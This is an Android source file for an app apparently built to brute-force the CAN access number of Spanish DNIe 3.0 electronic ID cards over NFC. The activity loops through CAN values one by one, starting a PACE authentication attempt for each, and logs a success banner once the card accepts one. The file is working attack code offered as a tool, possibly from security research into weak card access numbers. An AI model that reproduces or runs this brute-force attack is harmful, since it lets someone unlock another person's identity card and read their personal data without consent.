package app.unizar.dnie30_brute_force;

import android.Manifest;
import android.app.Activity;
import android.app.PendingIntent;
import android.content.Context;
import android.content.IntentFilter;
import android.content.pm.PackageManager;
import android.graphics.Typeface;
import android.nfc.NfcAdapter;
import android.nfc.Tag;
import android.os.Bundle;
import android.support.v4.app.ActivityCompat;
import android.support.v4.content.ContextCompat;
import android.text.TextWatcher;
import android.text.method.ScrollingMovementMethod;
import android.view.View;
import android.view.Menu;
import android.view.MenuItem;
import android.widget.TextView;

import java.io.IOException;
import java.util.logging.FileHandler;
import java.util.logging.Level;
import java.util.logging.Logger;

import app.unizar.dnie30_brute_force.tools.AsyncResponse;
import app.unizar.dnie30_brute_force.tools.CustomFormatterLog;
import app.unizar.dnie30_brute_force.tools.TextViewHandler;
import de.tsenger.androsmex.IsoDepCardHandler;

public class MainActivity extends Activity implements NfcAdapter.ReaderCallback, AsyncResponse {

    private static final Logger asLogger = Logger.getLogger("DNIe3.0_brute_force");
    public static Tag discoveredTag = null;
    // NFC Adapter
    static private NfcAdapter myNfcAdapter = null;
    private static FileHandler fh;    //Guardar logs en fichero
    private static String canNumber = "0";
    private static TextView textView = null;
    private static Tag tagFromIntent = null;
    private Activity myActivity;
    private boolean readerModeON = false;
    private int attemps = 1;
    private long beginTime, endTime, totalTime;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        Context myContext = MainActivity.this;
        myActivity = ((Activity) myContext);

        // Obtenemos el adaptador NFC
        myNfcAdapter = NfcAdapter.getDefaultAdapter(this);
        myNfcAdapter.setNdefPushMessage(null, this);
        myNfcAdapter.setNdefPushMessageCallback(null, this);

        //Mostrar logs en TextView
        textView = (TextView) findViewById(R.id.textView);
        textView.setMovementMethod(new ScrollingMovementMethod());
        textView.setTypeface(Typeface.MONOSPACE);
        TextViewHandler handler = new TextViewHandler(this, textView);
        asLogger.addHandler(handler);
        asLogger.setLevel(Level.parse("ALL"));


    }

    /**
     * Al pulsar en el botón se llamara a esta función, que empezará el
     * ataque de fuerza bruta a partir del número introducido en el
     * campo 'editText' o por 0 si no se ha escrito nada.
     */
    public void onClickStartPACE(View v) {
        asLogger.log(Level.ALL, "START\n");
        TextView pinText = (TextView) findViewById(R.id.editText);
        canNumber = pinText.getText().toString();
        if (canNumber.equals("")) {
            canNumber = "0";
        }

        beginTime = System.currentTimeMillis();
        DGLoader dgl = new DGLoader(asLogger, tagFromIntent, canNumber, getApplicationContext());
        dgl.delegate = this;
        dgl.execute((Void[]) null);
    }

    @Override
    public void onResume() {
        super.onResume();
        if (!readerModeON)
            readerModeON = EnableReaderMode(1000);
    }

    private boolean EnableReaderMode(int msDelay) {
        // Ponemos en msDelay milisegundos el tiempo de espera para comprobar presencia de lectores NFC
        Bundle options = new Bundle();
        options.putInt(NfcAdapter.EXTRA_READER_PRESENCE_CHECK_DELAY, msDelay);
        myNfcAdapter.enableReaderMode(myActivity,
                this,
                NfcAdapter.FLAG_READER_SKIP_NDEF_CHECK |
                        NfcAdapter.FLAG_READER_NFC_B,
                options);
        return true;
    }

    private boolean DisableReaderMode() {
        // Desactivamos el modo reader de NFC
        myNfcAdapter.disableReaderMode(this);
        readerModeON = false;
        return true;
    }

    /**
     * Se llamará a la función si se encuentra un tag NFC.
     */
    @Override
    public void onTagDiscovered(Tag tag) {
        try {
            tagFromIntent = tag;

            asLogger.log(Level.ALL, "TAG encontrado");

        } catch (Exception e) {
            asLogger.log(Level.ALL, "Ocurrió un error durante la lectura de ficheros.\n" + e.getMessage());
        }
    }

    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        // Inflate the menu; this adds items to the action bar if it is present.
        getMenuInflater().inflate(R.menu.menu_main, menu);
        return true;
    }

    @Override
    public boolean onOptionsItemSelected(MenuItem item) {
        // Handle action bar item clicks here. The action bar will
        // automatically handle clicks on the Home/Up button, so long
        // as you specify a parent activity in AndroidManifest.xml.
        int id = item.getItemId();

        //noinspection SimplifiableIfStatement
        if (id == R.id.action_settings) {
            return true;
        }

        return super.onOptionsItemSelected(item);
    }

    protected void onDestroy() {
        super.onDestroy();
    }

    /**
     * Esta función trae la ejecución en segundo plano a este hilo.
     * 'output' contiene el resultado de la ejecucion
     */
    @Override
    public void processFinish(String output) {
        if (!output.contains("correcto")) {
            asLogger.log(Level.ALL, "CAN " + canNumber + " incorrecto.");
            asLogger.log(Level.ALL, "Tiempo utilizado: " + output + " segundos.");
            int nextCAN = Integer.parseInt(canNumber) + 1;
            attemps++;
            canNumber = String.valueOf(nextCAN);
            asLogger.log(Level.ALL, "\nSiguiente intento con CAN: " + canNumber);
            DGLoader dgl = new DGLoader(asLogger, tagFromIntent, canNumber, getApplicationContext());
            dgl.delegate = this;
            dgl.execute((Void[]) null);
        } else {
            endTime = System.currentTimeMillis();
            totalTime = (endTime - beginTime) / 1000;
            asLogger.log(Level.ALL, "\n================================================================\n" +
                    "ATAQUE DE FUERZA BRUTA COMPLETADO CON ÉXITO\n" +
                    " -Intentos necesitados: " + attemps + ".\n" +
                    " -Tiempo total utilizado: " + totalTime + " segundos." +
                    "\n================================================================");
        }
    }

}
